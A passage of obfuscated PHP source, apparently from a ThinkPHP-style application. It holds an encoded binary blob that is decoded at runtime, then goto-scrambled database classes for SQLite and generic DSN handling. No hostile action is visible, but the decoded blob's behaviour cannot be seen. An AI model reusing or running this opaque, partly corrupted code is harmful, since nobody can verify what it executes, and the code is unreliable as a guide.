x7a\x81\x32\x99\xe8\x50\x18\x10\x2f\x60\x29\x1e\xf2\x5a\x2a\xa5\x8c\xee\x37\xd4\xa4\x15\xca\x9\xb0\x6c\x24\x93\x21\x2e\x4d\x41\x61\xd1\x65\xd9\x9d\x31\x74\xb6".base64_decode('iTjAaJJfKxTE5Ym856J/HZbjkNedaFeJLxWV6kzEBZ5JF5o0ES43S/kwvcRxpBalU6LsAJw=')."\x5e\xec\x8\xb3\x62\x0\x47\xed\xec\xa2\x97\xbd\x30\x60\x72\x95\xec\x2\x9e\xb\xe2\x11\x45\xe2\x87\x69\x7f\xf9\x85\x3d\xd6\x75\x3\x9a\x82\x75\x8b\x98\x52\x57\xbf\x49\xe\x63\x3e\xf9\x18\x7\x0\xca\x7c\xe6\x5".base64_decode('BzGaXoEZjlWNMQmx2PRpWkI2ZCpYOZUw34TSeoFQMFtbuu9hjxPMcW6WH7v4C7lSlK8C53s=')."\x7f\x74\xb9\x90\x9f\x16\x3d\xcd\xcf\x54\x38\x2e\xd8\xb\xd9\xa1\x94\xd0\x12\x72\xbf\x69\x5b\xfe\x3e\x2f\x7b\x8b\x97\xad\x37\x78\x88\xb7\xc2\xeb\xba\x13\x3e\xce\xeb\x11\x26\xe8\x9f\xf7\x8c\xa0\x30\x78\x2e\xa0\xb9".base64_decode('dL60zJkTfoQpOwW5D0B8MlwFYu4JS5jlImyhE+F4OljqNdDD8ueHpWGQ+l0qZj1EPcTD9DY=')."\53\276\140\354\170\324\320\75\241\225\120\2\107\243\131\271\313\335\305\254\170\32\224\266\110\314\246\74\105\137\330\30\60\351\40\147\307\224\223\314\66\316\357\55\262\13\166\67\230\341\130\55\210".base64_decode('TRD2k9Rnd9mOtDyXmjZ95lxZLiOmX1w7szdH6A+wWAKhFMcQehTmKFwmPSTTaSNU/tS2a8s=')."\xf9\x9f\x2d\x36\x71\xf6\xa1\xa0\x92\x5e\x32\xaf\xaf\xd2\xeb\x9a\x12\x8e\x4b\xaa\x70\x2e\xcd\x25\x13\x2b\x13\x59\xd2\x32\x75\xd6\x48\x79\x94\xa\xad\x95\xb6\x53\xb1\x9c\xe8\xd3\xc8\x66\x16\xb\x4\x72\xf8\x2\xc2".strrev('¦sáX’P?·²Ïš5´‰nŞ8¸Ueºm£\\ŸÃ¥²#Ü@¿u9ˆ²bH;/é³¥oCÎj.').base64_decode('iZ3j6JFPKL3h7jvEeM5R8J/OCFGF568lBZ7P6QNlJ/n51avZXnmRClmnbkfJ7AJBEcdsZ78=')."\x5d\xd5\xa3\x62\xa2\x8e\x55\x1e\x65\x22\xa0\x32\x8b\x5a\xf9\x95\x6c\xe1\x65\x52\xe2\x1f\x71\x69\x66\x7f\x3f\x81\x94\x82\x98\x7f\x3b\x39\x31\xf9\x25\x5e\x62\x39\x2d\x9c\x24\x91\x5\xea\x58\xac\x92\x7f\x7d\xd9\xf2".base64_decode('mFQkr4LyqqV3jYU4i8i/oEewhIlGB2lmoI1brmuSBqNTxsbcrPBFgsdeevLelMPSe9lo14g=')."\62\243\20\324\34\307\131\31\305\205\107\171\211\112\245\134\211\154\314\10\151\20\217\273\23\206\272\16\130\151\331\77\202\343\164\306\37\176\165\234\326\54\367\353\317\210\367\164\274\170\223\22\373".base64_decode('OezvQCyJDSD9mrRVi11ZhDrZ02A4IsmqyRGPZzrcSGDPii6KwZxTWK735Kl/eBpmZ4//9cM=').base64_decode('x/+v3jueWc9uFbgFIf4QN1lsg6MANBvf83I5CxVtuzrk3FsPB+RCs+AbFLSGxLnGPHOzybw=')."\x6f\x6a\xec\x1a\x50\xcb\x66\xa5\x1d\xb8\xf2\xe1\xa9\xec\x65\x7b\x84\x93\xfd\xfc\x29\xf3\x4a\x11\xb7\xa9\xb3\xfb\x95\xfb\x95\x44\xca\xcc\x9e\xa9\x5f\x25\xc8\xb\x4e\xab\x54\x4c\x7e\x1b\x1b\xd1\x9b\x82\x44\x2a\x49"."\135\50\105\252\205\353\102\2\260\227\157\335\226\324\260\12\162\13\306\357\13\232\227\67\222\375\25\224\1\210\342\260\363\205\10\211\305\51\3\23\315\107\234\20\327\135\146\241\44\76\345\22\47"."\76\60\15\262\233\205\150\201\235\207\153\141\227\131\165\72\243\206\304\271\13\20\105\231\20\72\222\312\310\147\302\61\271\216\104\171\336\4\215\363\71\275\112\101\211\16\327\323\335\24\310\222\307"."\xd6\x71\xcf\x51\xae\x1b\x52\x5e\x9a\x53\x16\xb9\x8\xb6\x6c\x70\xca\xf7\xf0\xb4\x92\x83\x51\xbd\xd7\x95\xd0\xe0\x75\x55\xc7\x5f\x2f\x77\x2e\x1a\xc7\x73\xda\x54\x9f\x6\xad\xb4\x18\x96\xe3\x30\x79\x1e\xb9\x1e\x23"."\167\351\336\362\62\164\201\304\5\314\4\113\264\62\305\340\215\22\62\115\34\222\307\203\121\236\256\242\111\330\115\147\52\227\155\111\52\344\111\111\160\354\346\40\151\362\24\137\331\256\310\210\260"."\x63\xa6\xb0\x82\xa2\xb8\x96\x4d\x44\x63\x21\x75\x69\x18\xbb\x4\x9\xaf\x8\x75\x33\xf7\xd7\x86\x49\x1e\xa7\x61\x55\x76\x77\xd4\x10\x73\x3f\x58\x0\xe8\x1c\xd5\x6a\xa\x54\xd2\x11\x79\x94\xa4\xd8\xc2\x87\xb3\x9d"."\x2b\x4\xf9\x25\xb2\xd3\x26\x5c\xb2\x1e\x61\xe\xd2\x64\xb9\xaa\x13\x18\xdb\x7\x39\xd7\xe2\x82\x4a\x60\x49\xb3\x68\xc9\xe\x50\x1d\x99\x98\xad\x33\x51\x6e\x8c\x89\x2\xd2\x4c\x13\xa4\x3b\x8f\x56\xb4\x9e\xb4\xf5"."\224\202\71\5\307\21\141\345\214\372\351\253\76\257\72\224\317\41\147\174\1\44\234\125\342\323\275\114\251\231\301\124\54\147\122\127\106\225\362\20\222\306\155\7\66\211\107\220\334\217\37\71\37"."\x3b\x6a\x94\x4\xbe\xf4\x1d\x29\xc7\x2b\x69\x65\x93\xd4\x69\x6\x5\xf\xe3\xca\xc3\x34\x62\xe2\x5c\x7c\x50\xe6\x57\xe6\xec\xd9\x1b\xac\x24\xe8\xc7\xfe\xd4\xb0\x9d\x8b\x9f\x20\x22\xc8\xe9\x97\xab\x39\x95\xe9\x47".strrev('s2I2Gˆ>r—tèJI\'! R¤9GÙÊ“l4èBó,ë–1h‘ÅÙ/„Ä~[ÒR„ña')."\311\16\65\110\327\332\116\255\2\156\63\134\266\347\226\214\210\224\115\112\61\327\276\350\27\173\67\10\13\177\127\44\233\336\331\5\6\65\356\122\316\135\252\333\161\162\226\164\20\222\204\230\204"."\312\257\234\305\115\270\304\310\262\142\370\350\55\230\11\127\272\104\174\305\366\250\15\12\266\134\34\13\123\251\126\155\260\2\150\112\167\273\4\104\51\34\224\260\365\222\133\22\141\225\244\17\311"."\x5f\x7\x38\x61\x5\xe4\x0\x2c\x4f\x15\x6e\x4b\xa4\xf2\xe2\xce\x51\x74\x13\xa7\x55\xea\x3e\x21\x86\xce\xe2\xb2\x5b\x14\x8e\x54\x22\x89\x3e\xb\xc6\x15\x76\xa4\x23\x38\x56\x70\x12\x9a\x3c\xb4\x2b\x5c\x16\x25\x3e"._kodDe('MWHWr6/lrg6JTwXVspFikadF9bTZPGUDRK/115G3GBG4vQH+oCeW8kavTt7vDLdF/gnWtk9o')."\x8d\xc8\x60\xdc\x8d\xe9\x18\x7c\x69\x7b\xe3\x1d\x3\xc8\x98\x9c\xe9\x68\x4e\x5\xd4\x60\xc7\x11\x59\x7c\x5b\x9e\x69\x66\xb3\xf8\x52\x79\x82\x6c\xaa\x95\x2c\x6d\xc6\xe5\x10\x42\xca\x4b\x1b\x44\x4e\xdf\x62\xe1\xd0"."\304\34\271\42\241\171\1\147\26\205\327\135\343\46\27\160\217\51\55\341\170\205\123\116\37\62\354\144\237\44\52\50\317\54\117\57\226\115\63\64\240\162\77\334\255\145\263\354\26\240\210\112\312"."\xda\x23\x69\x53\x25\xcc\xa\x65\x68\x8b\x2a\x16\xa3\x59\xb8\xa4\x38\x8a\x39\xca\x4e\x30\x4\xb8\x2c\xcd\xc2\x65\xcb\xb2\x59\xe1\xb2\x71\x25\xe5\x6c\xad\x64\x4d\xd0\xbd\xf2\xc1\x3\x81\x5c\xaa\x42\x87\x85\xd8\x4a"."\2\235\150\74\53\2\227\177\16\326\200\33\232\110\360\52\267\102\10\336\134\212\55\225\132\121\21\170\302\126\270\241\5\77\204\17\336\225\162\52\56\120\360\325\137\141\307\140\71\25\366\10\112"."\377\46\324\24\23\332\123\345\233\225\310\253\240\313\105\77\211\71\63\331\353\147\205\154\131\61\254\262\352\130\254\42\175\263\234\72\135\256\164\207\277\147\112\222\150\204\351\173\26\365\1\331\242"."\27\161\213\131\243\137\150\321\62\153\233\51\216\75\255\224\357\317\233\174\237\114\11\315\151\314\344\5\212\356\141\57\253\315\271\22\362\45\351\201\201\212\306\77\36\54\54\53\27\104\145\65\156"."\xb4\x29\x34\xb\xe9\x39\xdf\xb4\x8d\xa4\xee\x7c\xc5\x40\x76\x44\x48\xf3\xd9\x47\xb2\x92\x0\xde\x25\x15\x17\xa2\x3b\x87\xe6\x51\x5\x59\x31\x49\xa2\x41\x9f\xb8\xc2\xa2\xf5\x49\x5c\x9a\x40\x11\x87\x9d\x1e\xe5\x8d"."\340\276\220\352\35\4\361\245\40\277\143\46\16\366\51\57\101\263\343\146\321\366\340\274\204\131\40\277\315\246\155\13\65\36\52\35\43\47\2\314\20\170\44\55\65\24\22\227\313\270\121\344\252"."\x92\x60\x31\x21\x60\x24\x8\x1a\x10\x58\xda\x14\xd7\x69\x2e\x21\x7b\x8e\x8\xbe\x2\xe5\x11\x79\xbf\x87\xb\xce\xd6\x92\x4b\x57\x43\x24\xf4\x9b\xa9\x5e\x73\x98\xb9\xdf\x44\x78\x25\xd\x92\xb8\xdb\xd2\xdc\x4c\xee"."\xa0\xdb\x9c\x5c\xd6\xb9\x23\x7e\x65\x2c\x3f\xcd\xf1\xc3\x93\x59\x5e\x52\x7\xbc\x1d\xec\x5b\x5b\xc8\x38\x8a\xd3\x47\x4e\xb9\xf2\xfc\xe7\xd5\x0\x17\x1a\xa2\xa\xfa\x5e\xe\x91\x2e\x83\x1d\x61\x3c\x11\x2f\xcb\xea".strrev('´H¸8Ej\'ü®IZEÜ+4®W'."\n".'©Ø÷¬<²‘ÂuÊ\';Gµue–3)%)6YN¼ú±£KãÄ'."\n".'')."\204\335\11\106\340\215\126\61\13\322\35\131\241\317\144\127\137\14\76\256\261\247\321\345\333\25\75\47\74\373\212\62\116\51\234\74\333\26\163\301\315\3\316\27\54\135\212\306\116\335\30\206\324"."\x50\x2d\x56\x67\xec\x84\x2f\xc5\xa\x90\x8a\x9f\x24\xe2\xb4\x81\x1f\x36\x84\x16\x8d\xcf\xa1\xa0\x23\xa5\x93\xf5\x43\x8\x92\x84\x97\xf2\xd6\x4f\xee\x50\xb9\x70\x8e\x64\xd7\x55\x1c\x3c\xf9\x26\xa6\xfc\x2e\x90\xe4"."\212\301\301\315\74\303\4\25\331\265\146\257\70\337\301\301\17\234\6\300\160\113\12\254\64\354\310\266\265\14\223\235\72\324\121\250\110\35\323\13\41\354\376\77\233\370\337\264\263\274\0\0".strrev('').strrev('').""."", 10, -8))); goto fğÆÆ…Ø¢; eäòÓ¾¯„Ô: class DbSqlite extends DbSqliteBase { public function query($ÜóÉÊ“¼) { $„Ø¸ßç× =& $_SERVER[ùèÅ´Ãš]; if (!CacheLock::fileLock($„Ø¸ßç×[13])) { return !1; } $´äöáÄ” = parent::query($ÜóÉÊ“¼); CacheLock::fileUnLock($„Ø¸ßç×[13]); return $´äöáÄ”; } public function execute($è¦ø““¶) { $“–Êêı =& $_SERVER[ùèÅ´Ãš]; if (!CacheLock::fileLock($“–Êêı[13])) { return !1; } $ûÛĞ½½§ = parent::execute($è¦ø““¶); CacheLock::fileUnLock($“–Êêı[13]); return $ûÛĞ½½§; } } class DbSqlite3 extends DbSqlite3Base { public function query($”›“Î) { $¹ëÄî¸ =& $_SERVER[ùèÅ´Ãš]; if (!CacheLock::fileLock($¹ëÄî¸[13])) { return !1; } $¢«—İ’Ö = parent::query($”›“Î); CacheLock::fileUnLock($¹ëÄî¸[13]); return $¢«—İ’Ö; } public function execute($¸”­…) { $ÃŸË¸ =& $_SERVER[ùèÅ´Ãš]; if (!CacheLock::fileLock($ÃŸË¸[13])) { return !1; } $ÌŠõùˆ = parent::execute($¸”­…); CacheLock::fileUnLock($ÃŸË¸[13]); return $ÌŠõùˆ; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\x68\151\x6e\x6b\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\x71" => "\x3d", "\x6e\145\161" => "\74\76", "\x67\164" => "\x3e", "\x65\147\164" => "\x3e\x3d", "\x6c\x74" => "\x3c", "\145\x6c\164" => "\74\75", "\x6e\x6f\164\154\151\153\x65" => "\x4e\117\x54\x20\x4c\x49\x4b\105", "\154\151\x6b\145" => "\114\x49\113\105", "\151\x6e" => "\111\116", "\156\157\164\151\x6e" => "\x4e\x4f\124\40\x49\x4e", "\x6e\157\164\40\x69\x6e" => "\116\x4f\124\x20\x49\116", "\142\145\164\167\145\x65\x6e" => "\x42\105\x54\127\x45\105\116", "\x6e\x6f\x74\142\x65\164\x77\145\x65\156" => "\116\x4f\124\x20\102\x45\124\127\x45\x45\x4e", "\156\x6f\164\40\x62\145\x74\167\145\145\156" => "\x4e\x4f\124\40\102\x45\x54\x57\x45\x45\x4e"); protected $selectSql = "\x53\x45\114\105\103\x54\45\104\x49\x53\x54\111\116\x43\x54\x25\40\45\x46\111\x45\x4c\x44\45\x20\x46\122\x4f\x4d\x20\x25\x54\101\102\x4c\105\45\45\x4a\x4f\111\x4e\45\45\127\110\x45\x52\x45\x25\45\x47\x52\x4f\x55\x50\45\45\110\x41\x56\111\x4e\x47\x25\x25\x4f\x52\x44\x45\122\45\45\114\x49\115\111\124\45\x20\45\125\116\111\117\x4e\45\45\103\x4f\115\115\105\116\124\x25"; protected $bind = array(); public static function getInstance() { $ÃÈÄí¢ı = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[ùèÅ´Ãš][1048], $ÃÈÄí¢ı); } public function factory($ğ¦îõ± = '') { $Ç”«à‘ò =& $_SERVER[ùèÅ´Ãš]; $ğ¦îõ± = $this->parseConfig($ğ¦îõ±); if (empty($ğ¦îõ±[$Ç”«à‘ò[1049]])) { think_exception(think_lang($Ç”«à‘ò[1050])); } $this->dbType = ucwords(strtolower($ğ¦îõ±[$Ç”«à‘ò[1049]])); $éıÌÚÈÑ = $Ç”«à‘ò[1051] . $this->dbType; if (class_exists($éıÌÚÈÑ)) { $şñãÑû = new $éıÌÚÈÑ($ğ¦îõ±); if ($Ç”«à‘ò[1052] != strtolower($ğ¦îõ±[$Ç”«à‘ò[1049]])) { $şñãÑû->dbType = strtoupper($this->dbType); } else { $şñãÑû->dbType = $this->_getDsnType($ğ¦îõ±[$Ç”«à‘ò[1004]]); } } else { think_exception(think_lang($Ç”«à‘ò[1053]) . $Ç”«à‘ò[1054] . $éıÌÚÈÑ); } return $şñãÑû; } public function __call($óğÄ•î, $Ñı›­¹×) { if (method_exists($this, $óğÄ•î)) { return call_user_func_array(array($this, $óğÄ•î), $Ñı›­¹×); } } protected function _getDsnType($º°ÎÇì) { $¶’”«¢Ï = explode($_SERVER[ùèÅ´Ãš][4], $º°ÎÇì); $Â¹±¢’“ = strtoupper(trim($¶’”«¢Ï[0])); return $Â¹±¢’“; } private function parseConfig($‡õåÂ‘ø = '') { $£ÅøåÖ’ =& $_SERVER[ùèÅ´Ãš]; if (!empty($‡õåÂ‘ø) && is_string($‡õåÂ‘ø)) { $‡õåÂ‘ø = $this->parseDSN($‡õåÂ‘ø); } elseif (is_array($‡õåÂ‘ø)) { $‡õåÂ‘ø = array_change_key_case($‡õåÂ‘ø); $‡õåÂ‘ø = array($£ÅøåÖ’[1049] => $‡õåÂ‘ø[$£ÅøåÖ’[1055]], $£ÅøåÖ’[976] => $‡õåÂ‘ø[$£ÅøåÖ’[1056]], $£ÅøåÖ’[977] => $‡õåÂ‘ø[$£ÅøåÖ’[1057]], $£ÅøåÖ’[974] => $‡õåÂ‘ø[$£ÅøåÖ’[1058]], $£ÅøåÖ’[975] => $‡õåÂ‘ø[$£ÅøåÖ’[1059]], $£ÅøåÖ’[21] => $‡õåÂ‘ø[$£ÅøåÖ’[1060]], $£ÅøåÖ’[1004] => $‡õåÂ‘ø[$£ÅøåÖ’[1061]], $£ÅøåÖ’[17] => isset($‡õåÂ‘ø[$£ÅøåÖ’[1062]]) ? $‡õåÂ‘ø[$£ÅøåÖ’[1062]] : array()); } elseif (empty($‡õåÂ‘ø)) { if (think_config($£ÅøåÖ’[1063]) && $£ÅøåÖ’[1052] != strtolower(think_config($£ÅøåÖ’[1064]))) { $‡õåÂ‘ø = $this->parseDSN(think_config($£ÅøåÖ’[1063])); } else { $‡õåÂ‘ø = array($£ÅøåÖ’[1049] => think_config($£ÅøåÖ’[1064]), $£ÅøåÖ’[976] => think_config($£ÅøåÖ’[1065]), $£ÅøåÖ’[977] => think_config($£ÅøåÖ’[1066]), $£ÅøåÖ’[974] => think_config($£ÅøåÖ’[1067]), $£ÅøåÖ’[975] => think_config($£ÅøåÖ’[1068]), $£ÅøåÖ’[21] => think_config($£ÅøåÖ’[326]), $£ÅøåÖ’[1004] => think_config($£ÅøåÖ’[1063]), $£ÅøåÖ’[17] => think_config($£ÅøåÖ’[1069])); } } return $‡õåÂ‘ø; } protected function initConnect($ÍïÖÌ = true) { if (1 == think_config($_SERVER[ùèÅ´Ãš][22])) { $this->_linkID = $this->multiConnect($ÍïÖÌ); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $ÆÛğ„Ù => $€‚Ò·Ÿá) { $this->_linkID = $€‚Ò·Ÿá; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($Œ®Ò¢âÅ = false) { $çÁµÑƒÃ =& $_SERVER[ùèÅ´Ãš]; static $è®‘õÒ = array(); static $ç´ı…±Ï = -1; if (empty($è®‘õÒ)) { foreach ($this->config as $Ã“Ÿ÷¶á => $²Ú´ÌÁ) { $è®‘õÒ[$Ã“Ÿ÷¶á] = explode($çÁµÑƒÃ[50], $²Ú´ÌÁ); } } if (think_config($çÁµÑƒÃ[1070])) { if ($Œ®Ò¢âÅ || think_config($çÁµÑƒÃ[473]) === !0) { $’¶Áéï¬ = floor(mt_rand(0, think_config($çÁµÑƒÃ[1071]) - 1)); $ç´ı…±Ï = $’¶Áéï¬; } else { if (is_numeric(think_config($çÁµÑƒÃ[1072]))) { $’¶Áéï¬ = think_config($çÁµÑƒÃ[1072]); } else { $’¶Áéï¬ = floor(mt_rand(think_config($çÁµÑƒÃ[1071]), count($è®‘õÒ[$çÁµÑƒÃ[974]]) - 1)); } } } else { $’¶Áéï¬ = floor(mt_rand(0, count($è®‘õÒ[$çÁµÑƒÃ[974]]) - 1)); $ç´ı…±Ï = $’¶Áéï¬; } $’¶Áéï¬ = $ç´ı…±Ï !== -1 ? $ç´ı…±Ï : $’¶Áéï¬; $©‹‡ôë‚ = array($çÁµÑƒÃ[976] => isset($è®‘õÒ[$çÁµÑƒÃ[976]][$’¶Áéï¬]) ? $è®‘õÒ[$çÁµÑƒÃ[976]][$’¶Áéï¬] : $è®‘õÒ[$çÁµÑƒÃ[976]][0], $çÁµÑƒÃ[977] => isset($è®‘õÒ[$çÁµÑƒÃ[977]][$’¶Áéï¬]) ? $è®‘õÒ[$çÁµÑƒÃ[977]][$’¶Áéï¬] : $è®‘õÒ[$çÁµÑƒÃ[977]][0], $çÁµÑƒÃ[974] => isset($è®‘õÒ[$çÁµÑƒÃ[974]][$’¶Áéï¬]) ? $è®‘õÒ[$çÁµÑƒÃ[974]][$’¶Áéï¬] : $è®‘õÒ[$çÁµÑƒÃ[974]][0], $çÁµÑƒÃ[975] => isset($è®‘õÒ[$çÁµÑƒÃ[975]][$’¶Áéï¬]) ? $è®‘õÒ[$çÁµÑƒÃ[975]][$’¶Áéï¬] : $è®‘õÒ[$çÁµÑƒÃ[975]][0], $çÁµÑƒÃ[21] => isset($è®‘õÒ[$çÁµÑƒÃ[21]][$’¶Áéï¬]) ? $è®‘õÒ[$çÁµÑƒÃ[21]][$’¶Áéï¬] : $è®‘õÒ[$çÁµÑƒÃ[21]][0], $çÁµÑƒÃ[1004] => isset($è®‘õÒ[$çÁµÑƒÃ[1004]][$’¶Áéï¬]) ? $è®‘õÒ[$çÁµÑƒÃ[1004]][$’¶Áéï¬] : $è®‘õÒ[$çÁµÑƒÃ[1004]][0], $çÁµÑƒÃ[17] => isset($è®‘õÒ[$çÁµÑƒÃ[17]][$’¶Áéï¬]) ? $è®‘õÒ[$çÁµÑƒÃ[17]][$’¶Áéï¬] : $è®‘õÒ[$çÁµÑƒÃ[17]][0]); return $this->connect($©‹‡ôë‚, $’¶Áéï¬); } public function parseDSN($éßµû¨¼) { $‡œç–©Â =& $_SERVER[ùèÅ´Ãš]; if (empty($éßµû¨¼)) { return !1; } $¦Œéú³ = parse_url($éßµû¨¼); if ($¦Œéú³[$‡œç–©Â[208]]) { $š¿š—å£ = array($‡œç–©Â[1049] => $¦Œéú³[$‡œç–©Â[208]], $‡œç–©Â[976] => isset($¦Œéú³[$‡œç–©Â[669]]) ? $¦Œéú³[$‡œç–©Â[669]] : $‡œç–©Â[12], $‡œç–©Â[977] => isset($¦Œéú³[$‡œç–©Â[1073]]) ? $¦Œéú³[$‡œç–©Â[1073]] : $‡œç–©Â[12], $‡œç–©Â[974] => isset($¦Œéú³[$‡œç–©Â[209]]) ? $¦Œéú³[$‡œç–©Â[209]] : $‡œç–©Â[12], $‡œç–©Â[975] => isset($¦Œéú³[$‡œç–©Â[210]]) ? $¦Œéú³[$‡œç–©Â[210]] : $‡œç–©Â[12], $‡œç–©Â[21] => isset($¦Œéú³[$‡œç–©Â[87]]) ? substr($¦Œéú³[$‡œç–©Â[87]], 1) : $‡œç–©Â[12]); } else { preg_match($‡œç–©Â[1074], trim($éßµû¨¼), $À—£Ìëî); $š¿š—å£ = array($‡œç–©Â[1049] => $À—£Ìëî[1], $‡œç–©Â[976] => $À—£Ìëî[2], $‡œç–©Â[977] => $À—£Ìëî[3], $‡œç–©Â[974] => $À—£Ìëî[4], $‡œç–©Â[975] => $À—£Ìëî[5], $‡œç–©Â[21] => $À—£Ìëî[6]); } $š¿š—å£[$‡œç–©Â[1004]] = $‡œç–©Â[12]; return $š¿š—å£; } protected function debug() { $Üã“Õ¿İ =& $_SERVER[ùèÅ´Ãš]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $Üã“Õ¿İ[1075]; if (think_config($Üã“Õ¿İ[1076])) { think_status($Üã“Õ¿İ[1077]); think_trace($this->queryStr . $Üã“Õ¿İ[1078] . think_status($Üã“Õ¿İ[24], $Üã“Õ¿İ[1077], 6) . $Üã“Õ¿İ[1079], $Üã“Õ¿İ[12], $Üã“Õ¿İ[1080]); } } protected function parseLock($óˆ½§ÓÔ = false) { $ÆÚ»ı—¿ =& $_SERVER[ùèÅ´Ãš]; if (!$óˆ½§ÓÔ) { return $ÆÚ»ı—¿[12]; } if ($ÆÚ»ı—¿[1006] == $this->dbType) { return $ÆÚ»ı—¿[1081]; } return $ÆÚ»ı—¿[1082]; } protected function parseSet($·¬ìØõ) { $çãĞÀıæ =& $_SERVER[ùèÅ´Ãš]; foreach ($·¬ìØõ as $á§Ø¥¿ => $Ù×•‘Ôö) { if (is_array($Ù×•‘Ôö) && $çãĞÀıæ[374] == $Ù×•‘Ôö[0]) { $»¨¦¦×”[] = $this->parseKey($á§Ø¥¿) . $çãĞÀıæ[508] . $Ù×•‘Ôö[1]; } elseif (is_scalar($Ù×•‘Ôö) || is_null($Ù×•‘Ôö)) { $»¨¦¦×”[] = $this->parseKey($á§Ø¥¿) . $çãĞÀıæ[508] . $this->parseValue($Ù×•‘Ôö); } } return $çãĞÀıæ[1083] . implode($çãĞÀıæ[50], $»¨¦¦×”); } protected function bindParam($ó¾üÌí, $İÆĞè–ù) { $this->bind[$_SERVER[ùèÅ´Ãš][4] . $ó¾üÌí] = $İÆĞè–ù; } protected function parseBind($ËÆ›’²) { $ËÆ›’² = array_merge($this->bind, $ËÆ›’²); $this->bind = array(); return $ËÆ›’²; } function parseKey(&$‘ÄÂíÉÇ, $ŞöÄ¢íä = true) { if ($ŞöÄ¢íä) { $‘ÄÂíÉÇ = $this->parseKeyCheck($‘ÄÂíÉÇ); } return $‘ÄÂíÉÇ; } function parseKeyCheck($ò¿’æãü) { $«äøÛò£ =& $_SERVER[ùèÅ´Ãš]; $ò¿’æãü = trim($ò¿’æãü); if (!preg_match($«äøÛò£[1084], $ò¿’æãü)) { think_exception($«äøÛò£[1085] . $ò¿’æãü); } return $ò¿’æãü; } protected function parseValue($Ç¿ª©ü°) { $ÙãÑ½£’ =& $_SERVER[ùèÅ´Ãš]; if (is_string($Ç¿ª©ü°)) { $Ç¿ª©ü° = $ÙãÑ½£’[1045] . $this->escapeString($Ç¿ª©ü°) . $ÙãÑ½£’[1045]; } elseif (isset($Ç¿ª©ü°[0]) && is_string($Ç¿ª©ü°[0]) && strtolower($Ç¿ª©ü°[0]) == $ÙãÑ½£’[374]) { $Ç¿ª©ü° = $this->escapeString($Ç¿ª©ü°[1]); } elseif (is_array($Ç¿ª©ü°)) { $Ç¿ª©ü° = array_map(array($this, $ÙãÑ½£’[1046]), $Ç¿ª©ü°); } elseif (is_bool($Ç¿ª©ü°)) { $Ç¿ª©ü° = $Ç¿ª©ü° ? $ÙãÑ½£’[91] : $ÙãÑ½£’[231]; } elseif (is_null($Ç¿ª©ü°)) { $Ç¿ª©ü° = $ÙãÑ½£’[106]; } return $Ç¿ª©ü°; } protected function parseField($Ó’ØÕ·Ü) { $·¬¹Œ‚ø =& $_SERVER[ùèÅ´Ãš]; if (is_string($Ó’ØÕ·Ü) && strpos($Ó’ØÕ·Ü, $·¬¹Œ‚ø[50])) { $Ó’ØÕ·Ü = explode($·¬¹Œ‚ø[50], $Ó’ØÕ·Ü); } if (is_array($Ó’ØÕ·Ü)) { $°ºµ©ó = array(); foreach ($Ó’ØÕ·Ü as $å¦‡°îª => $À•àñÁ´) { if (!is_numeric($å¦‡°îª)) { $°ºµ©ó[] = $this->parseKey($å¦‡°îª, !1) . $·¬¹Œ‚ø[1086] . $this->parseKey($À•àñÁ´); } else { $°ºµ©ó[] = $this->parseKey($À•àñÁ´); } } $×ÒÙÃû = implode($·¬¹Œ‚ø[50], $°ºµ©ó); } elseif (is_string($Ó’ØÕ·Ü) && !empty($Ó’ØÕ·Ü)) { $×ÒÙÃû = $Ó’ØÕ·Ü; } else { $×ÒÙÃû = $·¬¹Œ‚ø[223]; } return $×ÒÙÃû; } protected function parseTable($‡ÉŠ•«Ø) { $˜ğçÕÚè =& $_SERVER[ùèÅ´Ãš]; if (is_array($‡ÉŠ•«Ø)) { $ÔÙºÀùó = array(); foreach ($‡ÉŠ•«Ø as $õçÖ¨éç => $§Š›Ò¡ğ) { if (!is_numeric($õçÖ¨éç)) { $ÔÙºÀùó[] = $this->parseKey($õçÖ¨éç) . $˜ğçÕÚè[53] . $this->parseKey($§Š›Ò¡ğ); } else { $ÔÙºÀùó[] = $this->parseKey($õçÖ¨éç); } } $‡ÉŠ•«Ø = $ÔÙºÀùó; } elseif (is_string($‡ÉŠ•«Ø)) { if (strstr($‡ÉŠ•«Ø, $˜ğçÕÚè[53])) { return $‡ÉŠ•«Ø; } $‡ÉŠ•«Ø = explode($˜ğçÕÚè[50], $‡ÉŠ•«Ø); array_walk($‡ÉŠ•«Ø, array($this, $˜ğçÕÚè[994])); } return $˜ğçÕÚè[988] . trim(implode($˜ğçÕÚè[1087], $‡ÉŠ•«Ø), $˜ğçÕÚè[463]) . $˜ğçÕÚè[988]; } protected function parseWhere($‡î¡Œç) { $‘ËÉîè =& $_SERVER[ùèÅ´Ãš]; $‡ŠÙÇëÖ = $‘ËÉîè[12]; if (is_string($‡î¡Œç)) { $‡ŠÙÇëÖ = $‡î¡Œç; } else { $ËµÊÛÎ = isset($‡î¡Œç[$‘ËÉîè[1088]]) ? strtoupper($‡î¡Œç[$‘ËÉîè[1088]]) : $‘ËÉîè[12]; if (in_array($ËµÊÛÎ, array($‘ËÉîè[1089], $‘ËÉîè[1090], $‘ËÉîè[1091]))) { $ËµÊÛÎ = $‘ËÉîè[53] . $ËµÊÛÎ . $‘ËÉîè[53]; unset($‡î¡Œç[$‘ËÉîè[1088]]); } else { $ËµÊÛÎ = $‘ËÉîè[1092]; } foreach ($‡î¡Œç as $‡·œÈÈí => $³ìëÌëÎ) { $‡ŠÙÇëÖ .= $‘ËÉîè[357]; if (is_numeric($‡·œÈÈí)) { $‡·œÈÈí = $‘ËÉîè[1093]; } if (0 === strpos($‡·œÈÈí, $‘ËÉîè[11])) { $‡ŠÙÇëÖ .= $this->parseThinkWhere($‡·œÈÈí, $³ìëÌëÎ); } else { if (!preg_match($‘ËÉîè[1094], trim($‡·œÈÈí))) { think_exception(think_lang($‘ËÉîè[1095]) . $‘ËÉîè[4] . 